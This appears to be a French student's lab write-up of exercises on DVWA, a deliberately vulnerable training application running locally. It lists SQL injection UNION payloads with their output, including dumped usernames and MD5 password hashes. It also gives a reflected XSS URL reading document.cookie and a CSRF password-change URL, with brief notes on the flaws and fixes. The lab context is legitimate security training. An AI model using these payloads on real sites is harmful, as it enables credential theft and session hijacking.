![alt text](image.png)

Ce message révèle une erreur dans la syntaxe de l'entrée, ici c'est le " ' " qui pose problème, ce qui rajoute une quote en trop et donc fausse la requête
---

![alt text](image-1.png)

Il y a 5 utilisateurs renvoyés car ici on fait une comparaison et comme la deuxième partie de la comparaison est toujours vraie alors la requête renvoie toute la table
--- 


Voici la version récupérée : 

ID: 1' UNION SELECT null, version()#
First name: admin
Surname: admin
ID: 1' UNION SELECT null, version()#
First name: 
Surname: 10.1.26-MariaDB-0+deb9u1

---

Voici le retour des 2 premières commandes :

ID: 1' ORDER BY 1#
First name: admin
Surname: admin

ID: 1' ORDER BY 2#
First name: admin
Surname: admin

et la dernière qui renvoie une erreur : 

*Unknown column '3' in 'order clause'*

---

Voici les tables : 
ID: 1' UNION SELECT database(), version()#
First name: admin
Surname: admin
ID: 1' UNION SELECT database(), version()#
First name: dvwa
Surname: 10.1.26-MariaDB-0+deb9u1

---
Voici les tables de la base courante :

ID: 1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
First name: admin
Surname: admin

ID: 1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
First name: 
Surname: guestbook

ID: 1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()#
First name: 
Surname: users

---

ID: 1' UNION SELECT user, password FROM users#
First name: admin
Surname: admin

ID: 1' UNION SELECT user, password FROM users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT user, password FROM users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT user, password FROM users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' UNION SELECT user, password FROM users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT user, password FROM users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

---

Les mots de passes sont dans un format hexadécimal MD5

On peut utiliser John the ripper

---

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

La faille ici est l'injection SQL, il n'y a pas de protection ni de validation du code 

--- 

**Partie 3:** 

![alt text](image-2.png)

Ici le XSS n'est pas persistant, mais pour la victime connecté si on envoie le script pour les cookie alors on peut réupérer les données de la session de la victime

http://localhost:8081/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#

le payload apparaît encodé ici 

---

Quand on recharge la page j'ai une fenêtre pop-up qui s'affiche me demande de confirmer l'envoi du formulaire une nouvelle fois :

![alt text](image-3.png)

Il est plus dangereux car le XSS est exécuté automatiquement pour toutes les victimes 

---

la donnée est insérée directement dans le HTML, dans le corps de la page.

C'est cette fonction htmlspecialchars qui est utilisé pour sécuriser le PHP : $message = htmlspecialchars($message);

---

**PARTIE 4** 

Voici l'URL : http://localhost:8081/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#

Le sparamètres envoyés : 
password_new
123
password_conf
123

Méthode de requête
GET

---

L'attaque a fonctionné car je ne peux plus me connecter

Pour changer les informations de session de mon compte 

Il aurait pu le faire sur un seul site 